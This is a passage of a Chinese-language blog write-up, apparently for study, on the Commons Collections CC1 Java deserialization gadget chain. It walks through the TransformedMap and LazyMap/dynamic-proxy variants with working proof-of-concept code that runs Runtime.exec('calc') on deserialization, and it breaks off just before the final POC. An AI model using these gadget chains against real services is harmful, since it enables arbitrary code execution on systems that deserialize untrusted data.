<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.Class;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)                                                             &#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> TransformedMap.decorate(hashMap,<span class="literal">null</span>,chain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor1.newInstance(Retention.class,map2);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(o);</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        o.readObject();</span><br><span class="line">        o.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成弹出计算机。</p>
<p>现在来看一下setValue()方法后续调用的方法的源码：</p>
<p><img src="/2024/08/13/CC1/image-20240722232359289.png" alt="image-20240722232359289"></p>
<p>然后就是TransformedMap类的checkSetValue()方法：<br><img src="/2024/08/13/CC1/image-20240722232448120.png" alt="image-20240722232448120"></p>
<p>由于我们前面就将valueTransformer设置为了chain链，所以后续都会往预估方向发展，具体过程可以参考前面的基础代码部分。</p>
<p>——————————</p>
<p>然后总结一下前面的问题：</p>
<ul>
<li>还是要注意一下Runtime类不能实例化的问题</li>
<li>反射获取<code>AnnotationInvocationHandler</code>类</li>
<li>进入for循环的需要put键值对的问题</li>
<li>if条件的进入条件</li>
</ul>
<p>在拉通整个过程时的调试过程中遇到的问题：</p>
<p>暂时对于很多都是初步了解吧，跟源码其实还有点看不懂，后面再来看看，简单给出示例代码，也许可以在调试过程中更容易理解：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map&lt;String, String&gt; innerMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        Map&lt;String, String&gt; outerMap = TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : outerMap.entrySet()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;成功进入循环遍历&quot;</span>);</span><br><span class="line">                System.out.println(entry);</span><br><span class="line">                System.out.println(<span class="string">&quot;key: &quot;</span> + entry.getKey() + <span class="string">&quot;  value: &quot;</span> + entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>打断点如下：</p>
<p><img src="/2024/08/13/CC1/image-20240722231513859.png" alt="image-20240722231513859"></p>
<p>看此时的值：<br><img src="/2024/08/13/CC1/image-20240722231605379.png" alt="image-20240722231605379"></p>
<p>然后再看上面的实例代码给出的结果：</p>
<p><img src="/2024/08/13/CC1/image-20240722231653896.png" alt="image-20240722231653896"></p>
<p>暂时就通过实例来稍微理解一下，看这个entry的值，前面所属就是<code>AbstractInputCheckedMapDecorator$MapEntry</code>（主要就是这里所属为什么是这个还有点不清楚），这样也就能够说明为什么readObject()方法中在调用setValue()方法时会到这个<code>MapEntry</code>类（就算直接在readObject方法打断点所属还是这个），从而导致整条链子的执行。</p>
<p><em>TransformedMap链暂时over</em>。</p>
<h5 id="LazyMap链"><a href="#LazyMap链" class="headerlink" title="LazyMap链"></a>LazyMap链</h5><p>实际上，在ysoserial链中，它利用的并不是TransformedMap，而是利用的LazyMap。</p>
<h6 id="分析及构造过程"><a href="#分析及构造过程" class="headerlink" title="分析及构造过程"></a>分析及构造过程</h6><p>LazyMap的漏洞触发点是它的<code>get()</code>方法get方法，也就是get方法源码中的<code>factory.transform()</code>。也就是LazyMap的作用是“懒加载”，在get找不到值的时候，它会调用<code>factory.transform</code>方法去获取一个值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="comment">//审代码如果传入的key不存在，就会才会进入这个if条件</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">this</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>相较于TransformedMap链的利用方法，LazyMap的利用更复杂一些，由于<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的readObject方法中没有调用到Map的get方法。但是<code>AnnotationInvocationHandler</code>类的invoke方法有调用到get方法，源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">            paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">            <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line">        <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">            <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line">        <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">            result = cloneArray(result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>那么如何调用到<code>AnnotationInvocationHandler#invoke</code>呢？这里就可以利用到动态代理。</p>
<p><strong>现在先回到LazyMap的get()方法源码</strong>，重点分析一下if语句：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="comment">//审代码如果传入的key不存在，就会才会进入这个if条件</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">this</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>来看进入if语句的条件，<code>this.map.containsKey(key)</code>就是看键值表中是否有这个key，在这里需要没有这个key才能进入if条件；那么这个key对应的invoke中的代码就是<code>String member = method.getName();</code> 学过动态代理的话就知道这里的member对应的就是代理对象调用的方法名，一般在一个java对象中都不会有一个以方法名为键的键值对，所以一般这里的if条件其实是可以忽略的。然后我想了一下，如果我认为设置一个键值对的键就是代理对象要调用的方法名称，那么是否应该不会继续下去。理论上是个人感觉是可以的，后面实践一下。</p>
<p>——</p>
<p>现在继续链子的说明</p>
<p>前面说到了需要用动态代理，所以这里需要用到<code>java.lang.reflect.Proxy</code>以及<code>InvocationHandler接口</code></p>
<p>在这里<code>AnnotationInvocationHandler</code>实现了<code>InvocationHandler</code>接口并重写了invoke方法，符合基本条件。</p>
<p>看代码所需的对象，这里就看看在哪些地方需要注意：<br>首先就是<code>AnnotationInvocationHandler#invoke</code>中调用get()的地方，<code>memberValues.get(member);</code>，所以这里的membervalues需要为LazyMap类对象，所以我们可以如下构造：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> clazz.getDeclaredConstroctor(Class.class,Map.class);</span><br><span class="line">constroctor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">object</span> <span class="variable">o</span> <span class="operator">=</span> constructor1.newInstance(Retention.class,outerMap);</span><br></pre></td></tr></table></figure>

<p>现在再来看一下outerMap的内容，现在首先就需要看一下LazyMap的构造方法等，稍微看一下源码，可以知晓我们利用到的代码为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以我们可以如下构造：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)&#125;);</span><br><span class="line">                                                             </span><br><span class="line"> <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"> <span class="type">Transformer</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chain);</span><br></pre></td></tr></table></figure>

<p>再将前面综合一下，就是如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor1.newInstance(Retention.class,outerMap);</span><br><span class="line">               </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最基本的链子大概如上，现在就是思考如何跳到LazyMap的get方法，结合前面的说法，现在就是要思考如何设置代理对象，结合动态代理的流程，在这里我们将Map接口类作为“中间”类，刚好“委托类”LazyMap是实现了Map接口的，所以是很合适的。</p>
<p>然后理解一下ysoserial链，可以知晓在遍历Map(proxy)时会调用memberValues.entrySet方法，进而可以触发invoke方法。</p>
<p>一步一步来，所以首先我们这里构造handler，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)constructor1.newInstance(Retention.class,outerMap);</span><br></pre></td></tr></table></figure>

<p>然后调用Proxy的newProxyInstance()方法，用来创建一个代理对象，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ysoerial链这里其实利用的是Map.class的构造器等，但是其实在最后的利用中差别不大，先跟这个</span></span><br><span class="line">Class[] interfaces = Map.class.getInterfaces();</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),interfaces,outerMap);</span><br></pre></td></tr></table></figure>

<p>这样就成功创建了一个代理对象，这是再看ysoserial，精妙的地方来了，如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Object o = constructor1.newInstance(Retention.class,proxyMap);</span><br></pre></td></tr></table></figure>

<p>然后再将这个o序列化并反序列化，当反序列化的时候，会对proxyMap调用entryMap()方法，此时就会到AnnotationInvocationHandler的invoke方法，然后一切都会往预期的方向发展。再将前面所有的代码结合起来稍微改改，就是如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)constructor1.newInstance(Retention.class,outerMap);</span><br><span class="line">        Class[] interfaces = Map.class.getInterfaces();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),interfaces,handler);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor1.newInstance(Retention.class,proxyMap);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">x</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        x.writeObject(o);</span><br><span class="line">        x.close();</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        ctf.readObject();</span><br><span class="line">        ctf.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>报错</p>
<p><img src="/2024/08/13/CC1/image-20240727002214764.png" alt="image-20240727002214764"></p>
<p>这是因为在设置代理对象时的第二个参数<code>Map.class.getInterfaces()</code>的Map.class没有并实现Map接口，动态代理没掌握好，照猫画虎了属于是，所以这里完全是多此一举了，我们就可以直接使用Map.class即可，而且本身Map就是一个接口类。</p>
<p>所以最终的POC为：</p>
